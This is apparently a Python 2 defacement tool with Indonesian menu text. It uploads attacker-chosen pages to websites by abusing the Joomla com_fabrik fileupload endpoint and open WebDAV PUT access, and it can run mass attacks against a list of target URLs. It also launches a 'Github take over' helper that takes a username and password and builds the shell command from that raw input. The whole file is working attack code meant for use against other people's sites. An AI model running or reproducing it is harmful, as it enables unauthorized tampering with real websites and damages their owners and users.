# encoding=utf8
import os, requests, sys, time
reload(sys)
sys.setdefaultencoding("utf8")
def com_fabrik():
    os.system("clear")
    os.system("toilet -f mono12 -F metal Fabrik")
    print (55*"\033[36m_")
    url = raw_input("\033[39m[\033[31m+\033[39m] Target URL   : \033[34m")
    if url.startswith("http"):
        pass
    else:
        url = ("http://" + url)
    while True:
        sc = raw_input("\033[39m[\033[31m+\033[39m] Script Deface: \033[34m")
        if sc.startswith("/s"):
            os.system("cp " + sc + " $HOME/termux-deface")
            print("\033[39m[\033[31m+\033[39m] \033[33mSekarang Cukup Masukan Nama Filenya!")
            sc = raw_input("\033[39m[\033[31m+\033[39m] Nama File: ")
        try:
            open_files = open(sc, 'rb')
            break
        except:
            print ("\033[39m[\033[31m*\033[39m] \033[31mFile Tidak Ditemukan!")
            continue
    if "?option=com_fabrik" in url:
        pass
    else:
        if "index.php" in url:
            url = url.split("index.php")
            url = (url[0] + "index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload")
        else:
            if url.endswith("/"):
                url = (url + "index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload")
            else:
                url = (url + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload")
        print ("\033[39m[\033[31m+\033[39m] Using Basic Exploit: \033[31m(\033[36m" + (url) + "\033[31m)")
    filena = {'file': open_files}
    try:
        deface = requests.post(url, files=filena)
    except:
        print ("\033[39m[\033[31m*\033[39m] \033[31mUrl Tidak Ditemukan!")
        wot = raw_input("\033[39m[\033[31m+\033[39m] Coba Lagi? [Y/n]: ")
        if wot =="y" or wot =="Y":
            return com_fabrik()
        else:
            os.system("python2 termux-deface.py")
    cekek = url.split("/index.php")
    see = requests.get(cekek[0] + "/" + sc)
    if see.status_code == 200:
        print("\033[32m" + cekek[0] + "/" + sc + " \033[32m>> \033[34mDefaced!")
    else:
        print("\033[34m" + cekek[0] + "/" + sc + " \033[32m>> \033[31mFailed Deface!")
    lagi = raw_input("\033[39m[\033[31m+\033[39m] Deface Lagi? [Y/n]: ")
    if lagi =="y" or lagi =="Y":
        return com_fabrik()
    else:
        os.system("python2 termux-deface.py")

def single_webdav(url):
    os.system("clear && toilet -f mono12 -F metal Webdav")
    print (55*"\033[36m_")
    sc = raw_input("\033[39m[\033[31m+\033[39m] Script Deface: \033[34m")
    with open(sc, 'rb') as f:
        script = f.read()
    if not url.endswith("/"):
        url = url + "/"
    r = requests.request('put', url + sc, data=script, headers={'Content-Type':'application/octet-stream'})
    if r.status_code < 200 or r.status_code >= 300:
        print("\033[34m" + url + sc + " \033[32m>> \033[31mFailed Deface!")
    else:
        print("\033[32m" + url + sc + " \033[32m>> \033[34mDefaced!")
    lagi = raw_input("\033[39m[\033[31m+\033[39m] Deface Lagi? [Y/n]: ")
    if lagi =="y" or lagi =="Y":
        linkGayn = raw_input("\033[39m[\033[31m+\033[39m] Target URL   : \033[34m")
        if linkGayn.startswith("http"):
            pass
        else:
            linkGayn = ("http://" + linkGayn)
        return single_webdav(linkGayn)
    else:
        os.system("python2 termux-deface.py")
        
def list_webdav():
    os.system("clear && toilet -f mono12 -F metal Webdav")
    print (55*"\033[36m_")
    while True:
        loss = raw_input("\033[39m[\033[31m+\033[39m] List File    : \033[34m")
        try:
            lists = open((loss), "r")
            lena = open((loss), "r")
            break
        except IOError:
            print ("\033[39m[\033[31m*\033[39m] \033[31mFile Tidak Ditemukan!")
            continue
    while True:
        sc = raw_input("\033[39m[\033[31m+\033[39m] Script Deface: \033[34m")
        try:
            script = open((sc), "rb").read()
            break
        except IOError:
            print ("\033[39m[\033[31m*\033[39m] \033[31mFile Tidak Ditemukan!")
            continue
    memeq = (len(lena.read().split()) + 1)
    tq = 0
    success = []
    for i in range(0, (memeq)):
        tq +=1
        if tq ==memeq:
            print ("\033[39m[\033[31m+\033[39m] Selesai...")
            print (50*"\033[33m_")
            print ("\033[35mSuccess:")
            if len(success) >=1:
                for hh in success:
                    print ("\033[32m" + hh)
                print (50*"\033[33m_")
                lagi = raw_input("\033[39m[\033[31m+\033[39m] Deface Lagi? [Y/n]: ")
                if lagi =="y" or lagi =="Y":
                    print (50*"\033[36m_")
                    return webdav()
                else:
                    os.system("python2 termux-deface.py")
            else:
                lagi = raw_input("\033[39m[\033[31m+\033[39m] Deface Lagi? [Y/n]: ")
                if lagi =="y" or lagi =="Y":
                    return webdav()
                else:
                    os.system("python2 termux-deface.py")
        url = lists.readline().strip()
        if not url.endswith("/"):
            url = url + "/"
        if url.startswith("http"):
            pass
        else:
            url = ("http://" + url)
        try:
            r = requests.request('put', url + sc, data=script, headers={'Content-Type':'application/octet-stream'})
        except:
            print ("\033[39m" + url + "\033[33m >> \033[31mUrl Tidak Ditemukan!")
            continue
        if r.status_code < 200 or r.status_code >= 300:
            print("\033[31m" + url + sc + " \033[32m>> \033[31mFailed Deface!")
        else:
            print("\033[32m" + url + sc + " \033[32m>> \033[34mDefaced!")
            success.append(url + sc)
def webdav():
    os.system("clear && toilet -f mono12 -F metal Webdav")
    print (55*"\033[36m_")
    print ("\033[33m[\033[34m1\033[33m] \033[39mSingle Deface")
    print ("\033[33m[\033[34m2\033[33m] \033[39mList Deface") 
    plih = input("\033[39m[\033[31m+\033[39m] Pilih-> \033[35m")
    if plih ==1:
        linkGayn = raw_input("\033[39m[\033[31m+\033[39m] Target URL   : \033[34m")
        if linkGayn.startswith("http"):
            pass
        else:
            linkGayn = ("http://" + linkGayn)
        single_webdav(linkGayn)
    elif plih ==2:
        list_webdav()
def selgit():
    os.system("clear && toilet -f mono12 -F metal Github")
    user = raw_input("\033[39m[\033[31m+\033[39m] Username Github  : \033[34m")
    pw = raw_input("\033[39m[\033[31m+\033[39m] Password Github  : \033[36m")
    repo = raw_input("\033[39m[\033[31m+\033[39m] Repositories Name: \033[34m")
    lis = raw_input("\033[39m[\033[31m+\033[39m] File List Web    : \033[36m")
    os.system("python2 selgit.py " + user + " " + pw + " " + repo + " " + lis)
def awal():
    os.system("clear")
    os.system("toilet -f mono12 -F metal Deface")
    print (55*"\033[33m_")
    print ("\033[33m[\033[34m1\033[33m] \033[39mDeface Com_fabrik")
    print ("\033[33m[\033[34m2\033[33m] \033[39mDeface Webdav")
    print ("\033[33m[\033[34m3\033[33m] \033[39mDeface Take Over Github")
    p = input("\033[39m[\033[31m+\033[39m] Pilih-> \033[35m")
    if p ==1:
        com_fabrik()
    elif p ==2:
        os.system("clear")
        print (50*"\033[36m_")
        webdav()
    elif p ==3:
        selgit()
    else:
        print ("\033[39m[\033[31m+\033[39m] Pilih Yang Bener -_*")
        time.sleep(4)
        return awal()
if __name__=="__main__":
    awal()
